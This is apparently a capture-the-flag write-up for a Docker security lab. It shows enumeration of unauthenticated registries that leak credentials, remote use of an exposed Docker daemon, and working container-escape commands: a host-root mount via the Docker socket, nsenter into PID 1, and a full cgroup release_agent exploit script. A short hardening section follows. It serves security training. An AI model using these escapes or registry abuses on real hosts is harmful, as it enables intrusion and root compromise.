> The Docker Rodeo

## Note: We have to make docker trust our instance. We have to create a file `/etc/docker/daemon.json` with entries, 

```json
{
	"insecure-registries" : ["docker-rodeo.thm:5000","docker-rodeo.thm:7000"] 
}
```

And we have to stop and start docker to apply changes made.

# Abusing Docker Registry

Docker Registries, at their fundamental, are used to store and provide published Docker images for use. Using repositories, creators of Docker images can switch between multiple versions of their applications and share them with other people with ease. Eg. DockerHub. For a Docker repository to have all versions of a product , the repository must store the data about every tag - this is what we'll be exploiting. Since Docker images are essentially just instruction manuals as we discussed earlier, they can be reversed to understand what commands took place when the image was being built - this information is stored in layers. Default docker registry port `5000`.

# Nmap

nmap -sV -vv docker-rodeo.thm -oN nmap/initial

```
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
2375/tcp open  docker  syn-ack Docker 19.03.13 (API 1.40)
| docker-version: 
|   GitCommit: 4484c46d9d
|   Components: 
|     
|       Version: 19.03.13
|       Name: Engine
|       Details: 
|         Experimental: false
|         GitCommit: 4484c46d9d
|         MinAPIVersion: 1.12
|         BuildTime: 2020-09-16T17:01:06.000000000+00:00
|         KernelVersion: 4.15.0-123-generic
|         Arch: amd64
|         Os: linux
|         GoVersion: go1.13.15
|         ApiVersion: 1.40
|     
|       Version: 1.3.7
|       Name: containerd
|       Details: 
|         GitCommit: 8fba4e9a7d01810a393d5d25a3621dc101981175
|     
|       Version: 1.0.0-rc10
|       Name: runc
|       Details: 
|         GitCommit: dc9208a3303feef5b3839f4323d9beb36df0a9dd
|     
|       Version: 0.18.0
|       Name: docker-init
|       Details: 
|         GitCommit: fec3683
|   MinAPIVersion: 1.12
|   BuildTime: 2020-09-16T17:01:06.000000000+00:00
|   KernelVersion: 4.15.0-123-generic
|   Arch: amd64
|   Os: linux
|   Platform: 
|     Name: Docker Engine - Community
|   Version: 19.03.13
|   GoVersion: go1.13.15
|_  ApiVersion: 1.40
5000/tcp open  http    syn-ack Docker Registry (API: 2.0)
7000/tcp open  http    syn-ack Docker Registry (API: 2.0)
```

**Note: Here we are using Postman tool to post requets**

1. Discovering Repositories 

Get Request to `http://docker-rodeo.thm:5000/v2/_catalog`.

```json
{
    "repositories": [
        "cmnatic/myapp1",
        "dive/challenge",
        "dive/example"
    ]
}
```

2. Now we have container name so we have to know about different versions available.

Get Request to `http://docker-rodeo.thm:5000/v2/cmnatic/myapp1/tags/list`

```json
{
    "name": "cmnatic/myapp1",
    "tags": [
        "notsecure",
        "latest",
        "secured"
    ]
}
```

# Grabbing the Data!

With these two important pieces of information about a repository known, we can enumerate that specific repository for a manifest file. This manifest file contains various pieces of information about the application, such as size, layers and other information. Let's grab the manifest file for the "notsecure" tag .

GET request to `http://docker-rodeo.thm:5000/v2/cmnatic/myapp1/manifests/notsecure`

```json
{
   "schemaVersion": 1,
   "name": "cmnatic/myapp1",
   "tag": "notsecure",
   "architecture": "amd64",
   "fsLayers": [
      {
         "blobSum": "sha256:6e9b6055dfc50d2c85f1d56a61686f0f155632ed00eb484f2faae99fcdde9bee"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:4429b8d1a27b563a13bea19a39dc9cda477b77bb94dcf95236b80bfaeaddd4b9"
      }
   ],
   "history": [
      {
         "v1Compatibility": "{\"architecture\":\"amd64\",\"config\":{\"Hostname\":\"\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"bash\"],\"ArgsEscaped\":true,\"Image\":\"sha256:bb3ff36f9b5eb9f8f32cf0584acac540428c04e7aa6fc20dbaca1b2380411d75\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":null},\"container\":\"52cf98d7eb6aa25be283eebcffbd897ed31b386258497bf1132f4fbeb5e033a1\",\"container_config\":{\"Hostname\":\"\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"/bin/sh\",\"-c\",\"echo \\\"thm{here_have_a_flag}\\\" \\u003e /root/root.txt\"],\"Image\":\"sha256:bb3ff36f9b5eb9f8f32cf0584acac540428c04e7aa6fc20dbaca1b2380411d75\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":null},\"created\":\"2020-10-24T19:32:51.335770476Z\",\"docker_version\":\"19.03.13\",\"id\":\"236e40b3b1f018782604f78df6557d6ad47ac3cb8ad36342ea9cac06225b5262\",\"os\":\"linux\",\"parent\":\"983e6c996aa7d6ff7492f8f57be975e997180bf809ec193b173dcea4f9f97cd6\"}"
      },
      {
         "v1Compatibility": "{\"id\":\"983e6c996aa7d6ff7492f8f57be975e997180bf809ec193b173dcea4f9f97cd6\",\"parent\":\"63555f783d1f8c6b12ed383963261c7d9693ceef04580944c103167117503219\",\"created\":\"2020-10-13T01:40:01.167771798Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  CMD [\\\"bash\\\"]\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"63555f783d1f8c6b12ed383963261c7d9693ceef04580944c103167117503219\",\"created\":\"2020-10-13T01:40:00.890033494Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) ADD file:ce4857398d963428cc93cbf7215159279fc5be5f51713a4637fb734be1c438b4 in / \"]}}"
      }
   ],
   "signatures": [
      {
         "header": {
            "jwk": {
               "crv": "P-256",
               "kid": "UFHK:JJEQ:2TT3:G6L7:CCIA:45ZM:EMFV:TYD6:WCFY:BHI3:IZHJ:X76S",
               "kty": "EC",
               "x": "X0XmJhbZw2otCWFliNtQTMqzeQKn8ceXuPdcjmiM4io",
               "y": "vtOFqLy-F1AxIlM55LBnupDYKeoVxc_n2SfnK0DTcDs"
            },
            "alg": "ES256"
         },
         "signature": "jESpG3SdSA0txUnvLoLpO9fUC_y-Mc-TXh8bLe1AMf2SJ8USl4trwIeFajgLHjWrmVVOznXMnBkEUmxvC-N6Bw",
         "protected": "eyJmb3JtYXRMZW5ndGgiOjI1NzAsImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAyMS0wNS0yMFQxNDoxOTo0NFoifQ"
      }
   ]
}
```

And we can see the CMD in here with a flag and other commands.

# Target : Port 7000

1. GET - `http://docker-rodeo.thm:7000/v2/_catalog`

```json
{
    "repositories": [
        "securesolutions/webserver"
    ]
}
```

2. GET - `http://docker-rodeo.thm:7000/v2/securesolutions/webserver/tags/list`

```json
{
    "name": "securesolutions/webserver",
    "tags": [
        "production"
    ]
}
```

3. GET - `http://docker-rodeo.thm:7000/v2/securesolutions/webserver/manifests/production`

```json
{
   "schemaVersion": 1,
   "name": "securesolutions/webserver",
   "tag": "production",
   "architecture": "amd64",
   "fsLayers": [
      {
         "blobSum": "sha256:7a668bba7a1a84d9db8a2fb2826f777e64233780a110041db8d42b797515cf57"
      },
      {
         "blobSum": "sha256:bc4544ab6267aaf520480ea4cc98e3169d252eab631801ef199b1ded807f306d"
      },
      {
         "blobSum": "sha256:07813898d5e66ad253cf5bb594a47c6963a75412ee3562d212d3bc1e896ad62f"
      },
      {
         "blobSum": "sha256:fdbb44f75d5b29f06c779f6eec33e886d165053275497583a150c9c2b444f3af"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:bb79b6b2107fea8e8a47133a660b78e3a546998fcf0427be39ac9a0af4a97e90"
      }
   ],
   "history": [
      {
         "v1Compatibility": "{\"architecture\":\"amd64\",\"config\":{\"Hostname\":\"\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"bash\"],\"ArgsEscaped\":true,\"Image\":\"sha256:1e4a2d11384ed8ac500f2762825c3f3d134ad5d78813a5d044357b66d4c91800\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":null},\"container\":\"72913ee3dc1d3bf6af92d8412b87a5803f04f7088ba7a8a4d8baf2de9078300d\",\"container_config\":{\"Hostname\":\"\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"/bin/sh\",\"-c\",\"printf \\\"Username: admin\\\\nPassword: production_admin\\\\n\\\" \\u003e /var/www/html/database.config\"],\"Image\":\"sha256:1e4a2d11384ed8ac500f2762825c3f3d134ad5d78813a5d044357b66d4c91800\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":null},\"created\":\"2020-10-24T19:48:37.160476683Z\",\"docker_version\":\"19.03.13\",\"id\":\"7b05b529c51e9322588fe7ef7e9be250681641b9f207900c035a26abc2b7eac2\",\"os\":\"linux\",\"parent\":\"a3531d00ed14133152959cb0bc77cb214a65638bb5e295f0a57262049f56add3\"}"
      },
      {
         "v1Compatibility": "{\"id\":\"a3531d00ed14133152959cb0bc77cb214a65638bb5e295f0a57262049f56add3\",\"parent\":\"a64c6dae778e931d83b59934a5b58f97b85e09c743ed1b18cb053ca0ecd2c58a\",\"created\":\"2020-10-24T19:48:36.298388069Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) COPY file:2c21f1c2caced37ec7c49be85e912509576e3aa6c68101bc90d3f56ae682b19c in /var/www/html/database.config \"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"a64c6dae778e931d83b59934a5b58f97b85e09c743ed1b18cb053ca0ecd2c58a\",\"parent\":\"2f585dc1662c7b0b99f93dfea45dd83e4b2bebdbf3e470c01e0569b941cb2cea\",\"created\":\"2020-10-24T19:48:36.007380392Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c mkdir -p /var/www/html/\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"2f585dc1662c7b0b99f93dfea45dd83e4b2bebdbf3e470c01e0569b941cb2cea\",\"parent\":\"3a41447eea9358b0bfca1df658a78a9fcfe2f8281da222f9bea7a70e2dc0a03c\",\"created\":\"2020-10-24T19:46:44.83701677Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c apt-get update -y\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"3a41447eea9358b0bfca1df658a78a9fcfe2f8281da222f9bea7a70e2dc0a03c\",\"parent\":\"5bd584b8f9464a6553e557ab0eceb484a63e77ab1b552c05eab75eeedde7c6d0\",\"created\":\"2020-10-13T01:39:05.467867564Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  CMD [\\\"bash\\\"]\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"5bd584b8f9464a6553e557ab0eceb484a63e77ab1b552c05eab75eeedde7c6d0\",\"created\":\"2020-10-13T01:39:05.233816802Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) ADD file:0dc53e7886c35bc21ae6c4f6cedda54d56ae9c9e9cd367678f1a72e68b3c43d4 in / \"]}}"
      }
   ],
   "signatures": [
      {
         "header": {
            "jwk": {
               "crv": "P-256",
               "kid": "TOEY:LUCB:WXHI:DGRZ:WMG5:EER5:7JBZ:PZEA:4IHY:SHHN:KBJK:KF6Q",
               "kty": "EC",
               "x": "Qa4l1kPcAvZQdbQ0B2ezM1SqI-JBhP8ETL2Pw4IYeg8",
               "y": "fqlt1ueHHz8gMKLbZfMr9WKz7Utd_U4-WS__-ReVJ68"
            },
            "alg": "ES256"
         },
         "signature": "-KVrURUt-u9gF7tmuTD758jTzGj30qY6cT3rHWMRFdf6xrcZVOV5YlCNz4K65MuN2JD0CSojPPYy5cKBjEi0Ow",
         "protected": "eyJmb3JtYXRMZW5ndGgiOjQwMTksImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAyMS0wNS0yMFQxNDoyNToyM1oifQ"
      }
   ]
}
```

Ooooh!🎉 We got credentials `admin`:`production_admin`

# Reversing Docker Images using dive

## Challenge : `docker pull docker-rodeo.thm:5000/dive/challenge`

We can download the image and instpect in dive using the command `dive <IMAGE-ID>`

We got 7 layers and user `uogctf`  is added.

# Uploading Malicious Docker Images

We can upload (or push) our own images to a repository, containing malicious code. Repositories can have as little or as many tags as the owners wish. However, every repository is guaranteed to have a "latest" tag. This tag is a copy of the latest upload of an image.When a docker pull or docker run command is issued, Docker will first try to find a copy of the image (i.e. cmnatic/myapp1) on the host and then proceed to check if there have been any changes made on the Docker registry it was pulled from. If there are changes, Docker will download the updated image onto the host and then proceed to execute.

Without proper authentication, we can upload our own image to the target's registry. That way, the next time the owner runs a docker pull or docker run command, their host will download and execute our malicious image as it will be a new version for Docker.

# RCE via Exposed Docker Daemon

Developers love to automate, and this is proven nonetheless with Docker. Whilst Docker uses a UNIX socket, meaning that it can only interact from the host itself. However, someone may wish to remotely execute Docker commands such as in Docker management tools like Portainer or DevOps applications like Jenkins to test their program. To achieve this, the daemon must use a TCP socket instead, permitting data for the Docker daemon to be communicated using the network interface and ultimately exposing it to the network for us to exploit.

By default, the engine will run on port 2375. Confirming that we can access the Docker daemon:

```bash
curl http://10.10.44.139:2375/version
```

```json
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"19.03.13","Details":{"ApiVersion":"1.40","Arch":"amd64","BuildTime":"2020-09-16T17:01:06.000000000+00:00","Experimental":"false","GitCommit":"4484c46d9d","GoVersion":"go1.13.15","KernelVersion":"4.15.0-123-generic","MinAPIVersion":"1.12","Os":"linux"}},{"Name":"containerd","Version":"1.3.7","Details":{"GitCommit":"8fba4e9a7d01810a393d5d25a3621dc101981175"}},{"Name":"runc","Version":"1.0.0-rc10","Details":{"GitCommit":"dc9208a3303feef5b3839f4323d9beb36df0a9dd"}},{"Name":"docker-init","Version":"0.18.0","Details":{"GitCommit":"fec3683"}}],"Version":"19.03.13","ApiVersion":"1.40","MinAPIVersion":"1.12","GitCommit":"4484c46d9d","GoVersion":"go1.13.15","Os":"linux","Arch":"amd64","KernelVersion":"4.15.0-123-generic","BuildTime":"2020-09-16T17:01:06.000000000+00:00"}
```

Let's execute commands now! `docker -H tcp://10.10.44.139:2375 ps`

```bash
63b932f4d7d2   privileged-container   "/usr/sbin/sshd -D"      6 months ago   Up 2 hours   0.0.0.0:2244->22/tcp     musing_stonebraker
2b28b54f56f6   namespaces             "/usr/sbin/sshd -D"      6 months ago   Up 2 hours   0.0.0.0:2255->22/tcp     goofy_diffie
3d8fe1db6635   container-socket       "/usr/sbin/sshd -D"      6 months ago   Up 2 hours   0.0.0.0:2233->22/tcp     brave_mendel
fd1d7cc1b972   registry:2             "/entrypoint.sh /etc…"   6 months ago   Up 2 hours   0.0.0.0:5000->5000/tcp   registry_example-registry_1
c5bd077f9ddb   registry:2             "/entrypoint.sh /etc…"   6 months ago   Up 2 hours   0.0.0.0:7000->5000/tcp   registry_actual-registry-1_1
```

# Useful Commands

1. network ls - Used to list the networks of containers, we could use this to discover other applications running and pivot to them from our machine!
2. images - List images used by containers, data can also be exfiltrated by reverse-engineering the image.
3. exec - Execute a command on a container
4. run	- Run a container

# Escape via Exposed Docker Daemon

For this task, we're going to assume that we have managed to gain a foothold onto the container from something such as a vulnerable website running in a container.

1. Connecting to the container: SSH credntials `danny`:`danny` Port 2233
2. Looking for the exposed Docker socket
Armed with the knowledge we've learnt about the Docker socket in "Vulnerability #4: RCE via Exposed Docker Daemon", we can look for exposure of this file within the container, and confirm whether or not the current user has permissions to run docker commands with groups.

```bash
cd /var/run
ls -la | grep sock
srw-rw---- 1 root docker    0 May 20 13:41 docker.sock
groups
danny docker
```

3. Mount host volumes
In the instance of this room, I have already downloaded the "alpine" image to the container that you are exploiting. In a THM room, you will most likely have to upload this image to the container before you can execute it, as Instances do not deploy with an internet connection. Now that we've confirmed we can execute Docker commands, let's mount the host directory to a new container and then connect to that to reveal all the data on the host OS! `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`

# Shared Namespaces

Containers have networking capabilities and their own file storage...I mean we have previously used SSH to connect to the container into them and there were files present! They achieve this by using three components of the Linux kernel:

1. Namespaces
2. Cgroups
3. OverlayFS

But we're only going to be interested in namespaces here, after all, they lay at the heart of it. Namespaces essentially segregate system resources such as processes, files and memory away from other namespaces. Every process running on Linux will be assigned two things:

1. A namespace
2. A process identifier (PID)

Namespaces are how containerization is achieved! Processes can only "see" the process that is in the same namespace - no conflicts in theory. Take Docker for example, every new container will be running as a new namespace, although the container may be running multiple applications (and in turn, processes). Put simply, the process with an ID of 0 is the process that is started when the system boots. Processes numbers increment and must be started by another process, so naturally, the next process ID will be #1. This process is the systems init , for example, the latest versions of Ubuntu use systemd. Any other process that runs will be controlled by systemd (process #1). We can use process #1's namespace on an operating system to escalate our privileges. Whilst containers are designed to use these namespaces to isolate from another, they can instead, coincide with the host computers processes, rather than isolated from...this gives us a nice opportunity to escape!

1. Connecting to the container: SSH credntials `root`:`danny` Port 2244
2. We'll be invoking the nsenter command. To summarise, this command allows you to execute start processes and place them within the same namespace as another process. 

`nsenter --target 1 --mount sh`

2.1. We use the --target switch with the value of "1" to execute our shell command that we later provide to execute in the namespace of the special system process ID, to get ultimate root!

2.2 Specifying --mount this is where we provide the mount namespace of the process that we are targeting. "If no file is specified, enter the mount namespace of the target process.

2.3. As we are targeting  the "/sbin/init" process #1 (although it's actually a symbolic link to "lib/systemd/systemd" for backwards-compatibility), we are using the namespace and permissions of the systemd daemon for our new process (the shell)     

2.4. Here's where our process that will be executed into this privileged namespace: sh or a shell. This will execute in the same namespace (and therefore privileges of) the kernel.

# Misconfigured Privileges

Linux capabilities are root permissions given to processes or executables within the Linux kernel. These privileges allow for the granular assignment of privileges - rather than just assigning them all.

These capabilities determine what permissions a Docker container has to the operating system, and how they are interacted with. Docker containers can run in two modes:

1. User mode
2. Privileged mode

Containers running in "user" mode interact with the operating system through the Docker engine. Privileged containers, however, do not do this...instead, they bypass the Docker engine and have direct communication with the operating system.Well, if a container is running with privileged access to the operating system, we can effectively execute commands as root - perfect! We can use a system package such as "libcap2-bin"'s capsh to list the capabilities our container has: capsh --print . I've highlighted a few interesting privileges that we have been given, but greatly encourage you to research into anymore that may be exploited! Privileges like these indicate that our container is running in privileged mode. We are only leveraging the "sys_admin" capability

1. Connecting to the container: SSH credntials `root`:`danny` Port 2244
2. capsh --print | grep sys_admin

## Reference : https://linux.die.net/man/7/capabilities

# Exploit

```
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/exploit" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /exploit
echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
chmod a+x /exploit
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs
```

# Flag.txt

```
thm{you_escaped_the_chains}
```

# Determining we are in a container

1. Listing running processes:

Containers, due to their isolated nature, will often have very little processes running in comparison to something such as a virtual machine. We can simply use ps aux to print the running processes. A virtual machine has a tonne more processes running in comparison.

2.  Looking for .dockerenv

Containers allow environment variables to be provided from the host operating system by the use of a ".dockerenv" file. This file is located in the "/" directory, and would exist on a container - even if no environment variables were provided: cd / && ls -lah

3. Those pesky cgroups

Note how we utilised "cgroups" in Task 10. Cgroups are used by containerisation software such as LXC or Docker. Let's look for them with by navigating to "/proc/1" and then catting  the "cgroups" file...It is worth mentioning that the "cgroups" file contains paths including the word "docker"

# Securing our containers

1. The Principle of Least Privileges:
Whilst this is an over-arching theme of InfoSec as a whole, we'll pertain this to Docker...

Remember Docker images? The commands in these images will execute as root unless told otherwise. Let's say you create a Docker image for your webserver, in this case, the service will run as root. If an attacker managed to exploit the web server, they would now have root permissions to the container and may be able to use the techniques we outlined in Task 10 and 11.

2. Docker  Seccomp 101:
Seccomp or "Secure computing" is a security feature of the Linux kernel, allowing us to restrict the capability of a container by determining the system calls it can make. Docker uses security profiles for containers. For example, we can deny the container the ability to perform actions such as using the mount namespace  (see Task 10 for demonstration of this vulnerability) or any of the Linux system calls.

3. Securing your Daemon:
In later installs of the Docker engine, running a registry relies on the use of implementing self-signed SSL certificates behind a web server, where these certificates must then be distributed and trusted on every device that will be interacting with the registry. This is quite the hassle for developers wanting to setup quick environments - which goes against the entire point of Docker.

# Reference

https://github.com/dirtycow/dirtycow.github.io
https://github.com/dirtycow/dirtycow.github.io
https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.
https://docs.google.com/presentation/d/1WdByuxWgayPb-RstO-XaENSqVPGP7h6t3GS6W4jk4tk/htmlpresent